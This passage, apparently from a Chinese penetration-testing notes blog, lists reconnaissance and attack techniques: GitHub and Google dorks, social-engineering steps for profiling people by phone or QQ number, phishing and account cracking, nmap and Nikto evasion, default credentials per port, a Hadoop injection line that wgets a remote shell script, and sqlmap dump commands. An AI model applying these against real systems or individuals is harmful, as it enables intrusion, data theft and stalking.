<h3 id="7-业务相关"><a href="#7-业务相关" class="headerlink" title="7. 业务相关"></a>7. <strong>业务相关</strong></h3><p>github泄露：<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">in:name test #仓库标题搜索含有关键字 SpringCloud  </span><br><span class="line">in:descripton test #仓库描述搜索含有关键字  </span><br><span class="line">in:readme test #Readme文件搜素含有关键字  </span><br><span class="line">stars:&gt;3000 test #stars数量大于3000的搜索关键字  </span><br><span class="line">stars:1000..3000 test #stars数量大于1000小于3000的搜索关键字  </span><br><span class="line">forks:&gt;1000 test #forks数量大于1000的搜索关键字  </span><br><span class="line">forks:1000..3000 test #forks数量大于1000小于3000的搜索关键字  </span><br><span class="line">size:&gt;=5000 test #指定仓库大于5000k(5M)的搜索关键字  </span><br><span class="line">pushed:&gt;2019-02-12 test #发布时间大于 2019-02-12的搜索关键字  </span><br><span class="line">created:&gt;2019-02-12 test #创建时间大于2019-02-12的搜索关键字  </span><br><span class="line">user:test #用户名搜素  </span><br><span class="line">license:apache-2.0 test #明确仓库的 LICENSE 搜索关键字  </span><br><span class="line">language:java test #在java语言的代码中搜索关键字  </span><br><span class="line">user:test in:name test #组合搜索,用户名test的标题含有test的</span><br></pre></td></tr></table></figure><br>网盘泄露：<br>各种云网盘，详见虫部落搜索:<br><a href="http://magnet.chongbuluo.com">http://magnet.chongbuluo.com</a><br>敏感路径扫描：<br><a href="https://github.com/ring04h/weakfilescan">https://github.com/ring04h/weakfilescan</a></p>
<h2 id="OSINT-公开情报收集"><a href="#OSINT-公开情报收集" class="headerlink" title="OSINT 公开情报收集"></a>OSINT 公开情报收集</h2><h3 id="1-社工技巧"><a href="#1-社工技巧" class="headerlink" title="1.社工技巧"></a><strong>1.社工技巧</strong></h3><p><strong>查看注册的网站</strong>：0xreg reg007<br>知道账号去已注册的网站找回密码，可以看到打码后的用户名、邮箱、真实姓名等信息，如果运气好没准能从数据包或html中找到未被打码的信息</p>
<p><strong>可以从这些方面判断用户是否注册过</strong><br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">找回密码  </span><br><span class="line">输入账号，如果进入下一步了则该账号存在  </span><br><span class="line">登录  </span><br><span class="line">输入账号和密码，如果提示密码错误，则表示该用户已存在  </span><br><span class="line">注册  </span><br><span class="line">填写账号时一般网站会去检测该账号是否已存在，如果已存在则会提示不可重复注册</span><br></pre></td></tr></table></figure></p>
<p><strong>知道QQ</strong><br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">通过QQ邮箱和QQ号搜索支付宝、淘宝账号等其他可能的常用平台  </span><br><span class="line">去腾讯\新浪微博搜索  </span><br><span class="line">通过微信搜索  </span><br><span class="line">查看QQ空间\相册\地区\星座\生日\昵称(后续构建字典以及跨平台搜集)  </span><br><span class="line">通过说说、留言、日志找到其好友  </span><br><span class="line">加QQ钓鱼\共同好友\可能认识的人  </span><br></pre></td></tr></table></figure><br><strong>知道手机号</strong><br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">搜索QQ、微信、钉钉等社交账号  </span><br><span class="line">在比较火的一些APP和网站上注册或忘记密码来判断是否注册过账号  </span><br><span class="line">查询支付宝、QQ交易账号，尝试输入常见姓氏获取名字(转账到该手机号,会提示输入姓氏验证)  </span><br><span class="line">通过对方的职业、兴趣找到该领域知名度较高的社交网站反查  </span><br><span class="line">根据在QQ空间、朋友圈等动态用百度识图识别照片  </span><br><span class="line">在微博、ins、Twitter、fb、百度贴吧搜索相近关键字，按地域、年龄、男女、用户名等筛选  </span><br></pre></td></tr></table></figure><br><strong>留意社交动态</strong><br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">发布时间线  </span><br><span class="line">使用什么客户端 iPhone Android还是浏览器  </span><br><span class="line">针对客户端预先制定exploit  </span><br><span class="line">注意每一条链接 / 图片 / 视频链接可能包含用户ID  </span><br><span class="line">图片可能包含水印，exif可能会有GPS定位和手机类型,图片内容特征  </span><br><span class="line">视频也有可能有水印暴露社交账号ID,拍摄地点  </span><br><span class="line">从最早发布的动态看起，会有很大收获  </span><br><span class="line">一般得到一个账号的密码就相当于得到了其他账号的密码  </span><br><span class="line">一般人不同账号的用户名都是相同或相近的  </span><br><span class="line">一般人的社交账号头像用的都是一样的  </span><br><span class="line">尝试破解社保、公积金账号、身份z号（出生地、生日、星座、派出所代码）</span><br></pre></td></tr></table></figure></p>
<p>虫部落快搜之文件搜索:<a href="https://search.chongbuluo.com/">https://search.chongbuluo.com/</a></p>
<p>qq群、群文件、贴吧论坛、目标自用论坛等社交平台<strong>钓鱼</strong>和<strong>信息泄露</strong>(爬邮箱等信息)</p>
<p>电子邮件伪造、网络钓鱼<br>下载恶意程序<br>输入敏感信息</p>
<p>大部分信息可以用来生成密码字典</p>
<p>对人：说服对方达成一致、恐吓对方（敏感词、漏洞、病毒、权威机构名称、），钓鱼获取信息</p>
<h3 id="2-搜索引擎OSINT"><a href="#2-搜索引擎OSINT" class="headerlink" title="2.搜索引擎OSINT"></a>2.<strong>搜索引擎OSINT</strong></h3><p><strong>Google Hacking</strong>(baidu\bing\souhu\github)<br>GoogleHacking常用语法<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1、intext：（仅针对Google有效） 把网页中的正文内容中的某个字符作为搜索的条件  </span><br><span class="line">2、intitle： 把网页标题中的某个字符作为搜索的条件  </span><br><span class="line">3、cache： 搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息  </span><br><span class="line">4、filetype/ext： 指定一个格式类型的文件作为搜索对象  </span><br><span class="line">5、inurl： 搜索包含指定字符的URL  </span><br><span class="line">6、site： 在指定的(域名)站点搜索相关内容　　  </span><br><span class="line">GoogleHacking其他语法  </span><br><span class="line">1、引号 ” ” 把关键字打上引号后，把引号部分作为整体来搜索  </span><br><span class="line">2、or 同时搜索两个或更多的关键字  </span><br><span class="line">3、link 搜索某个网站的链接 link:http://baidu.com即返回所有和baidu做了链接的URL  </span><br><span class="line">4、info 查找指定站点的一些基本信息　　GoogleHackingDatabase:  </span><br></pre></td></tr></table></figure><br>google-hacking-databaseGoogleHacking典型用法(<strong>特定资产的万能密码</strong>也要积累)</p>
<p>管理后台地址</p>
<blockquote>
<p>site:<a href="http://target.com">http://target.com</a> intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system<br>site:<a href="http://target.com">http://target.com</a> inurl:login | inurl:admin | inurl:manage<br>| inurl:manager | inurl:admin_login | inurl:system | inurl:backend<br>site:<a href="http://target.com">http://target.com</a> intitle:管理 | 后台 | 后台管理 | 登陆 | 登录</p>
</blockquote>
<p>上传类漏洞地址</p>
<blockquote>
<p>site:<a href="http://target.com">http://target.com</a> inurl:file<br>site:<a href="http://target.com">http://target.com</a> inurl:upload</p>
</blockquote>
<p>注入页面（批量注入工具、结合搜索引擎）</p>
<blockquote>
<p>site:<a href="http://target.com">http://target.com</a> inurl:php?id=</p>
</blockquote>
<p>编辑器页面</p>
<blockquote>
<p>site:<a href="http://target.com">http://target.com</a> inurl:ewebeditor</p>
</blockquote>
<p>目录遍历漏洞</p>
<blockquote>
<p>site:<a href="http://target.com">http://target.com</a> intitle:index.of</p>
</blockquote>
<p>SQL错误</p>
<blockquote>
<p>site:<a href="http://target.com">http://target.com</a> intext:”sql syntax near” | intext:”syntax error has occurred” | intext:”incorrect syntax near” | intext:”unexpected end of SQL command” | intext:”Warning: mysql_connect()” | intext:”Warning: mysql_query()” | intext:”Warning: pg_connect()”</p>
</blockquote>
<p>phpinfo()</p>
<blockquote>
<p>site:<a href="http://target.com">http://target.com</a> ext:php intitle:phpinfo “published by the PHP Group”</p>
</blockquote>
<p>配置文件泄露</p>
<blockquote>
<p>site:<a href="http://target.com">http://target.com</a> ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini</p>
</blockquote>
<p>数据库文件泄露</p>
<blockquote>
<p>site:<a href="http://target.com">http://target.com</a> ext:.sql | .dbf | .mdb | .db</p>
</blockquote>
<p>日志文件泄露</p>
<blockquote>
<p>site:<a href="http://target.com">http://target.com</a> ext:.log</p>
</blockquote>
<p>备份和历史文件泄露</p>
<blockquote>
<p>site:<a href="http://target.com">http://target.com</a> ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar</p>
</blockquote>
<p>公开文件泄露</p>
<blockquote>
<p>site:<a href="http://target.com">http://target.com</a> filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv</p>
</blockquote>
<p>邮箱信息</p>
<blockquote>
<p>site:<a href="http://target.com">http://target.com</a> intext:@<a href="http://target.com">http://target.com</a><br>site:<a href="http://target.com">http://target.com</a> 邮件<br>site:<a href="http://target.com">http://target.com</a> email</p>
</blockquote>
<p>社工信息</p>
<blockquote>
<p>site:<a href="http://target.com">http://target.com</a> intitle:账号 | 密码 | 工号 | 学号 | 身份z</p>
</blockquote>
<p><strong>2.3浏览器实用插件：</strong><br>Wappalyzer：识别网站使用的中间件及其版本，再去漏洞库和搜索引擎找公开披露的漏洞<br>SwitchOmega：快捷切换代理<br>shodan：识别开放端口，主机服务等（被动信息搜集）<br>hacktools:综合插件,很强大<br>firefox渗透便携版version48,工具集成很多<br>注意：根据获得服务、中间件信息、编辑器版本、数据库等OSINT去各大漏洞库、搜索引擎找漏洞利用</p>
<p><strong>2.4乌云和cnvd</strong><br>乌云库\乌云镜像\GHDB\CNVD等公开漏洞库</p>
<h1 id="主动探测"><a href="#主动探测" class="headerlink" title="主动探测"></a>主动探测</h1><p>从管理员和用户的角度了解整个WEB应用乃至整个目标的全貌，主动探测会暴露ip以及留下日志信息，所以要…</p>
<h2 id="主动扫描"><a href="#主动扫描" class="headerlink" title="主动扫描"></a>主动扫描</h2><h3 id="常见服务漏洞"><a href="#常见服务漏洞" class="headerlink" title="常见服务漏洞"></a><strong>常见服务漏洞</strong></h3><p>nmap的功能:<br>脚本扫描，隐蔽扫描，端口扫描，服务识别，OS识别，探测WAF<br>nmap脚本主要分为以下几类，在扫描时可根据需要设置<br>–script=类别这种方式进行比较笼统的扫描：</p>
<p>auth: 负责处理鉴权证书（绕开鉴权）的脚本<br>broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务<br>brute: 提供暴力破解方式，针对常见的应用如http/snmp等<br>default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力<br>discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等<br>dos: 用于进行拒绝服务攻击<br>exploit: 利用已知的漏洞入侵系统<br>external: 利用第三方的数据库或资源，例如进行whois解析<br>fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞<br>intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽<br>malware: 探测目标机是否感染了病毒、开启了后门等信息<br>safe: 此类与intrusive相反，属于安全性脚本<br>version: 负责增强服务与版本扫描（Version Detection）功能的脚本<br>vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">nmap --script=auth 192.168.137.* </span><br><span class="line">负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令 </span><br><span class="line"></span><br><span class="line">nmap --script=brute 192.168.137.* </span><br><span class="line">提供暴力破解的方式 可对数据库，smb，snmp等进行简单密码的暴力猜解 </span><br><span class="line"></span><br><span class="line">nmap --script=default 192.168.137.* 或者 nmap -sC 192.168.137.* </span><br><span class="line">默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击 </span><br><span class="line"></span><br><span class="line">nmap --script=vuln 192.168.137.* 检查是否存在常见漏洞 </span><br><span class="line"></span><br><span class="line">nmap -n -p445 --script=broadcast 192.168.137.4 </span><br><span class="line">在局域网内探查更多服务开启状况 </span><br><span class="line"></span><br><span class="line">nmap --script external 202.103.243.110 利用第三方的数据库或资源，例如进行whois解析 nmap --script banner ip nmap -p port -sV ip 获取软件版本信息 nmap -O ip 操作系统信息，版本 nmap -A -v -sS -T2 ip 完整信息获取,详细显示，syn探测，高速扫描，系统和服务版本信息，脚本扫描和路由跟踪,外网扫描T2比较合适，T4以上不准确 -sN;-sF;-sX 隐蔽扫描 　　-sN是Null扫描,是通过发送非常规的TCP通信数据包进行探测 　　nmap -sN 127.0.0.1 　　-sF是FIN扫描,当我们使用TCP SYN扫描时可能会被目标主机的防火墙发现,会阻止SYN数据包 　　,这时我们使用TCP FIN扫描方式会有很好的穿透效果. 　　nmap -sF 127.0.0.1 扫描前1000号TCP端口 nmap 192.168.100.2 Ping扫描8个本地主机(按ARP、ICMP、TCP 80的顺序) nmap –sP 192.168.100.0-7 扫描80,443端口 nmap -p 80,443 192.168.100.2 扫描前1000号TCP端口，OS指纹，服务，然后运行一个NSE脚本 sudo nmap -A 192.168.100.2 扫描全部65535个TCP端口，OS指纹，服务，然后运行一个NSE脚本 sudo nmap –A –p- 192.168.100.2 扫描前1000号UDP端口 sudo nmap -sU 192.168.100.2 扫描所有65535个UDP端口 sudo nmap -sU –p- 192.168.100.2 扫描所有65535个UDP端口，并获取服务、OS指纹，之后运行一些NSE脚本 sudo nmap –sU -p- -A 192.168.100.2</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h3 id="常见端口漏洞利用"><a href="#常见端口漏洞利用" class="headerlink" title="常见端口漏洞利用"></a><strong>常见端口漏洞利用</strong></h3><p>快速扫描：<br>Masscan -p80,800 ip –rate=10000<br>21 / FTP  匿名/暴力破解 拒绝服务</p>
<p>22 / SSH  暴力破解</p>
<p>23 / telnet  Winbox(CVE-2018-14847)  <a href="https://github.com/BasuCert/WinboxPoC">https://github.com/BasuCert/WinboxPoC</a>  弱口令 / 暴力破解</p>
<p>161 / snmp  弱口令  <a href="https://blog.csdn.net/archersaber39/article/details/78932252">https://blog.csdn.net/archersaber39/article/details/78932252</a></p>
<p>389 / ladp  匿名访问  <a href="https://www.cnblogs.com/persuit/p/5706432.html">https://www.cnblogs.com/persuit/p/5706432.html</a><br>ladp注入<br><a href="http://www.4hou.com/technology/9090.html">http://www.4hou.com/technology/9090.html</a><br><a href="https://www.freebuf.com/articles/web/149059.html">https://www.freebuf.com/articles/web/149059.html</a></p>
<p>443 / ssl  openssl心脏出血<br><a href="https://paper.seebug.org/437/">https://paper.seebug.org/437/</a><br><a href="http://www.anquan.us/static/drops/papers-1381.html">http://www.anquan.us/static/drops/papers-1381.html</a><br><a href="https://www.freebuf.com/sectool/33191.html">https://www.freebuf.com/sectool/33191.html</a></p>
<p>445 / smb  win10拒绝服务  永恒之蓝RCE  875 / rsync  匿名访问<br><a href="http://www.anquan.us/static/bugs/wooyun-2016-0190815.html">http://www.anquan.us/static/bugs/wooyun-2016-0190815.html</a><br><a href="https://paper.seebug.org/409/">https://paper.seebug.org/409/</a><br><a href="http://www.91ri.org/11093.html">http://www.91ri.org/11093.html</a></p>
<p>1433 / mssql  暴力破解<br><a href="http://www.anquan.us/static/drops/tips-12749">http://www.anquan.us/static/drops/tips-12749</a>.　　html<br><a href="https://www.seebug.org/appdir/Microsoft%20SQL%20Server">https://www.seebug.org/appdir/Microsoft%20SQL%20Server</a></p>
<p>1521 / oracle  暴力破解<br><a href="https://www.exploit-db.com/exploits/33084">https://www.exploit-db.com/exploits/33084</a></p>
<p>2601 / zebra<br><a href="http://www.anquan.us/static/bugs/wooyun-2013-047409.html">http://www.anquan.us/static/bugs/wooyun-2013-047409.html</a><br>3128 / squid</p>
<p>3306 / mysql<br>RCE<br><a href="http://www.91ri.org/17511.html">http://www.91ri.org/17511.html</a><br>CVE-2015-0411<br>hash破解<br><a href="https://www.freebuf.com/column/153561.html">https://www.freebuf.com/column/153561.html</a><br>waf绕过<br><a href="https://www.freebuf.com/articles/web/155570.html">https://www.freebuf.com/articles/web/155570.html</a><br>general_log_file getshell<br><a href="https://www.freebuf.com/column/143125.html">https://www.freebuf.com/column/143125.html</a><br>提权<br><a href="http://www.91ri.org/16540.html">http://www.91ri.org/16540.html</a></p>
<p>3312 / kangle<br>getshell<br><a href="https://www.secpulse.com/archives/23927.html">https://www.secpulse.com/archives/23927.html</a></p>
<p>3389 / rdp<br>shift 放大镜 输入法绕过 guest用户<br>永恒之蓝(ESTEEMAUDIT)<br><a href="https://www.freebuf.com/articles/system/132171.html">https://www.freebuf.com/articles/system/132171.html</a><br><a href="https://www.anquanke.com/post/id/86328">https://www.anquanke.com/post/id/86328</a><br>ms12-020<br><a href="https://blog.csdn.net/meyo_leo/article/details/77950552">https://blog.csdn.net/meyo_leo/article/details/77950552</a></p>
<p>4440 / rundeck<br><a href="https://www.secpulse.com/archives/29500.html">https://www.secpulse.com/archives/29500.html</a></p>
<p>4848 / glassfish<br>文件读取<br><a href="https://www.secpulse.com/archives/42277.html">https://www.secpulse.com/archives/42277.html</a><br><a href="https://www.anquanke.com/post/id/85948">https://www.anquanke.com/post/id/85948</a><br>GlassFish2 / admin:admin GlassFish3,4 / 如果管理员不设置帐号本地会自动登录,远程访问会提示配置错误</p>
<p>5432 / PostgreSQL  RCE<br><a href="https://www.cnblogs.com/KevinGeorge/p/8521496.html">https://www.cnblogs.com/KevinGeorge/p/8521496.html</a><br><a href="https://www.secpulse.com/archives/69153.html">https://www.secpulse.com/archives/69153.html</a><br>默认账号postgres<br>参考<br><a href="http://www.91ri.org/13070.html">http://www.91ri.org/13070.html</a><br><a href="http://www.91ri.org/6507.html">http://www.91ri.org/6507.html</a></p>
<p>5672,15672,4369,25672 / RabbitMQ<br>（guest/guest）</p>
<p>5900 / VNC<br><a href="https://www.seebug.org/appdir/RealVNC">https://www.seebug.org/appdir/RealVNC</a></p>
<p>5984 / CouchDB<br><a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a></p>
<p>6082 / varnish<br>CLI 未授权<br><a href="https://www.secpulse.com/archives/10681.html">https://www.secpulse.com/archives/10681.html</a></p>
<p>6379 / redis<br>Redis未授权<br>ssh publickey<br>crontab<br>webshell<br>反序列化<br>开机自启文件夹写bat<br>参考<br><a href="https://www.freebuf.com/column/170710.html">https://www.freebuf.com/column/170710.html</a></p>
<p>7001,7002 / WebLogic<br>默认弱口令<br>weblogic/weblogic ,weblogic/welcom ,weblogic/welcom1,weblogic1/weblogic<br>反序列<br>CVE-2018-2628<br><a href="https://www.freebuf.com/articles/web/169770.html">https://www.freebuf.com/articles/web/169770.html</a><br><a href="https://www.seebug.org/appdir/WebLogic">https://www.seebug.org/appdir/WebLogic</a></p>
<p>9200,9300 / elasticsearch<br>CVE-2015-1427<br><a href="http://www.anquan.us/static/drops/papers-5142.html">http://www.anquan.us/static/drops/papers-5142.html</a><br>CVE-2018-17246<br><a href="https://www.seebug.org/vuldb/ssvid-97730">https://www.seebug.org/vuldb/ssvid-97730</a><br>参考<br><a href="https://www.seebug.org/search/?keywords=elasticsearch">https://www.seebug.org/search/?keywords=elasticsearch</a></p>
<p>9000 / fcgi<br><a href="https://paper.seebug.org/289/">https://paper.seebug.org/289/</a></p>
<p>9043 / WebSphere<br>Websphere8.5<br><a href="https://localhost:9043/ibm/console/logon.jsp">https://localhost:9043/ibm/console/logon.jsp</a><br>Websphere6-7<br><a href="http://localhost:9043/ibm/console">http://localhost:9043/ibm/console</a><br>后台未授权，登录后可部署WAR包<br>SOAP服务有反序列化<br>弱口令：admin / password</p>
<p>11211 / memcache<br>未授权<br>UDP反射<br><a href="https://shockerli.net/post/memcached-udp-reflection-attack-bug/">https://shockerli.net/post/memcached-udp-reflection-attack-bug/</a></p>
<p>27017,27018 / Mongodb<br>未授权<br>注入<br><a href="https://www.anquanke.com/post/id/83763">https://www.anquanke.com/post/id/83763</a><br>phpMoAdmin RCE<br><a href="https://www.aqniu.com/threat-alert/6978.html">https://www.aqniu.com/threat-alert/6978.html</a></p>
<p>50000 / SAP<br>SAP命令执行<br><a href="https://www.secpulse.com/archives/20204.html">https://www.secpulse.com/archives/20204.html</a></p>
<p>50070,50030 / hadoop<br>未授权<br><a href="https://www.freebuf.com/vuls/173638.html">https://www.freebuf.com/vuls/173638.html</a><br>命令执行<br>host:50060/pstack?pid=123|wget <a href="http://somehost/shell.sh">http://somehost/shell.sh</a><br><a href="https://www.seebug.org/search/?keywords=hadoop">https://www.seebug.org/search/?keywords=hadoop</a><br>其他<br><a href="http://www.91ri.org/15441.html">http://www.91ri.org/15441.html</a></p>
<h3 id="WAF及bypass"><a href="#WAF及bypass" class="headerlink" title="WAF及bypass"></a><strong>WAF及bypass</strong></h3><p>探测WAF<br>Nmap探测WAF有两种脚本，<br>一种是http-waf-detect，一种是http-waf-fingerprint。<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">nmap -p port --script=http-waf-detect ip</span><br><span class="line"></span><br><span class="line">wafw00f -a http://example.com 　　</span><br><span class="line">sqlmap-u “http://www.vxxxx.org/ex.php?id=1” --identify-waf</span><br></pre></td></tr></table></figure><br>bypass:<br>手工注入</p>
<h3 id="目录、后台和敏感路径文件扫描"><a href="#目录、后台和敏感路径文件扫描" class="headerlink" title="目录、后台和敏感路径文件扫描"></a><strong>目录、后台和敏感路径文件扫描</strong></h3><p>御剑目录（土司专版，笔记里有）、后台扫描（图片属性地址暴露），<br>完善目录和账密字典方法：<br>基础字典包合并去重<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">dymerge.py -u</span><br><span class="line"></span><br><span class="line">python pydictor.py -tool uniqbiner /my/dict/dirpath --output uniq.txt</span><br><span class="line"></span><br><span class="line">python pydictor.py -tool uniqifer /tmp/dicts.txt --output /tmp/uniq.txt</span><br></pre></td></tr></table></figure></p>
<h2 id="人工浏览-逐个请求burp"><a href="#人工浏览-逐个请求burp" class="headerlink" title="### 人工浏览\逐个请求burp"></a>### 人工浏览\逐个请求burp</h2><p>非常重要,有必要手动去浏览每个页面，点击页面上每一个跳转，这样在Burp的sitemap里面就可以出现这些请求和响应。<br>图片后台地址\图片后面的信息<br>跳转参数\奇怪的参数<br>泄露邮箱等社工信息<br>业务逻辑\架构</p>
<h2 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h2><p>自动化渗透测试框架:(待补充)<br>Sn1per<br>Ary<br>自动化信息收集效率较高，从github上多找一找，也可以自己写</p>
<h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><h2 id="漏洞扫描工具"><a href="#漏洞扫描工具" class="headerlink" title="漏洞扫描工具"></a>漏洞扫描工具</h2><p>注意:登录类网站扫描要带cookies扫才能扫到</p>
<h3 id="Nikto-Web服务漏洞扫描器"><a href="#Nikto-Web服务漏洞扫描器" class="headerlink" title="Nikto Web服务漏洞扫描器"></a><strong>Nikto Web服务漏洞扫描器</strong></h3><p>Tips:利用-Format选项来导出特定格式的扫描结果，使扫描结果更容易阅读和分析。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nikto -host http://example.com -output ~/nikto.html -Format html</span><br></pre></td></tr></table></figure><br>NIKTO使用方法：<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1、命令：nikto -update #升级，更新插件；  </span><br><span class="line">2、Nikto -list-plugins #查看插件；  </span><br><span class="line">3、Nikto -host http://1.1.1.1 #扫描目标：域名方式；  </span><br><span class="line">4、Nikto -host http://1.1.1.1 -output #扫描并输出结果  </span><br><span class="line">5、Nikto -host 1.1.1.1 -port 80 #扫描目标：ip地址加端口号  </span><br><span class="line">6、Nikto -host http://www.baidu.com -port 443 -ssl #扫描https网站  </span><br><span class="line">7、Nikto -host 文件名.txt #批量扫描目标  </span><br><span class="line">8、nmap -p80 192.168.1.0/24 -oG - | nikto -host -  </span><br><span class="line">#利用nmap扫描开放80端口的IP段并且oG（nmap结果输出并整理）通过管道的方式  </span><br><span class="line">“|”用nikto进行扫描  </span><br><span class="line">9、nikto -host 192.168.0.1 -useproxy http://localhost:8070  </span><br><span class="line">#利用代理进行扫描  </span><br><span class="line">10、-vhost  </span><br><span class="line">#当一个网站存在多个端口时可以使用-vhost  </span><br><span class="line">遍历所有网站进行扫描或一个ip对应多个网站  </span><br><span class="line">11、Nikto交互形参数</span><br></pre></td></tr></table></figure></p>
<p>配置文件：<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">路径：/etc/nikto.conf  </span><br><span class="line">User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本；  </span><br><span class="line">在nikto中最好修改成别的浏览器user agent；  </span><br><span class="line">设置cookie：  </span><br><span class="line">在配置文件中找到cookie进行设置（#STATIC-COOKIE= &quot;cookie1&quot;=&quot;cookie value&quot;;&quot;cookie2&quot;=&quot;cookie val&quot;）</span><br></pre></td></tr></table></figure></p>
<p>IDS逃避技术：<br>主要为了躲避IDS、IPS检测告警-evasion #此参数使用方式（Nikto -host <a href="http://1.1.1.1">http://1.1.1.1</a> -evasion 1234）<br>逃避方式共8种：<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1、随机url编码，</span><br><span class="line">2、自选路径，</span><br><span class="line">3、过早结束的URL  </span><br><span class="line">4、优先考虑长随机字符串</span><br><span class="line">5、参数欺骗  </span><br><span class="line">6、使用TAB作为命令的分隔符，</span><br><span class="line">7、使用变化的URL  </span><br><span class="line">8、使用Windows路径分隔符</span><br></pre></td></tr></table></figure></p>
<h3 id="AWVS漏扫"><a href="#AWVS漏扫" class="headerlink" title="AWVS漏扫"></a><strong>AWVS漏扫</strong></h3><p>这个没什么好说的，破解版到处都是。</p>
<h3 id="NESSUS"><a href="#NESSUS" class="headerlink" title="NESSUS"></a><strong>NESSUS</strong></h3><p>实时更新插件的漏扫，很好用，就是激活流程麻烦。<br><a href="https://www.wuyini.cn/765.html">https://www.wuyini.cn/765.html</a></p>
<h3 id="Xray自动化的漏洞挖掘"><a href="#Xray自动化的漏洞挖掘" class="headerlink" title="Xray自动化的漏洞挖掘"></a><strong>Xray自动化的漏洞挖掘</strong></h3><p>burp+xray：<br>BurpSuite + Xray 被动扫描配置 - Ritte - 博客园<br>或者直接挂浏览器，点到哪里，扫到哪里<br>xray+各种漏扫联动</p>
<h3 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a><strong>Fuzz</strong></h3><p>Fuzz可以发现应用程序中没有被引用但是确实是可以访问的页面。<br>Discover Content是Burp中专门用于此目的的工具。<br>Burp Intruder也可以通过字典攻击来实施强制浏览(通常是在url参数和文件路径部分进行修改)，爆破、注入等。<br>FuzzDB包含一些用于此目的的非常牛逼的字典。</p>
<h2 id="挖掘漏洞"><a href="#挖掘漏洞" class="headerlink" title="挖掘漏洞"></a>挖掘漏洞</h2><h3 id="SQL注入："><a href="#SQL注入：" class="headerlink" title="SQL注入："></a><strong>SQL注入：</strong></h3><p>初步测试：见框就上，加’ “ ) ))% and 1=1 and 1=2　and2-1 or ，<br>抓包爆破常用SQL注入payload字典，上burp intruder<br><strong>纯手工注入和手工绕过waf，详见笔记。</strong><br>通过搜索引擎，批量查找注入点，详见笔记。<br>然后用傀儡注入点批量搜集工具</p>
<p>实操案例：<br>sql注入思路（登录界面）和网络常用端口_u011975363的专栏-CSDN博客<br>超级SQL注入工具（github）</p>
<p>sqlmap一把梭：<br>注意：命令为kali linux中运行的 （windows中用python sqlmap.py执行）</p>
<p>注入六连：<br>1.sqlmap -u “<a href="http://www.xx.com?id=x&quot;">http://www.xx.com?id=x&quot;</a> 查询是否存在注入点<br>2.–dbs 检测站点包含哪些数据库<br>3.–current-db 获取当前的数据库名<br>4.–tables -D “db_name” 获取指定数据库中的表名 -D后接指定的数据库名称<br>5.–columns -T “table_name” -D “db_name” 获取数据库表中的字段<br>6.–dump -C “columns_name” -T “table_name” -D “db_name”<br>获取字段的数据内容</p>
<p>COOKIE注入：<br>sqlmap -u “<a href="http://www.xx.com/xxx.asp&quot;">http://www.xx.com/xxx.asp&quot;</a> –cookie “id=XXX cookie” –level 2 ＼<br>cookie注入 后接cookie值</p>
<p>POST注入：<br>（1）目标地址http:// <a href="http://www.xxx.com">http://www.xxx.com</a> /login.asp<br>（2）打开burp代理<br>（3）点击表单提交<br>（4）burp获取拦截信息（post）<br>（5）右键保存文件（.txt）到指定目录下<br>（6）运行sqlmap并执行如下命令：<br>用例：sqlmap -r okay.txt -p username<br>// -r表示加载文件(及步骤（5）保存的路径)<br>-p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数）<br>（7）自动获取表单：–forms自动获取表单<br>例如：sqlmap -u <a href="http://www.xx.com/login.asp">http://www.xx.com/login.asp</a> –forms<br>（8）指定参数搜索：–data<br>例如:sqlmap -u <a href="http://www.xx.com/login.asp">http://www.xx.com/login.asp</a> –data “username=1”</p>
<p>常用指令：<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">--purge 【重新扫描（--purge 删除原先对该目标扫描的记录）</span><br><span class="line"></span><br><span class="line">--tables 【获取表名</span><br><span class="line"></span><br><span class="line">--dbs 【检测站点包含哪些数据库</span><br><span class="line"></span><br><span class="line">--current-db 【获取当前的数据库名</span><br><span class="line"></span><br><span class="line">--current-user 【检测当前用户</span><br><span class="line"></span><br><span class="line">--is-dba 【判断站点的当前用户是否为数据库管理员</span><br><span class="line"></span><br><span class="line">--batch 【默认确认，不询问你是否输入</span><br><span class="line"></span><br><span class="line">--search 【后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D）</span><br><span class="line"></span><br><span class="line">--threads 10 【线程，sqlmap线程最高设置为10  </span><br><span class="line">--level 3 【sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头  </span><br><span class="line">的值，  </span><br><span 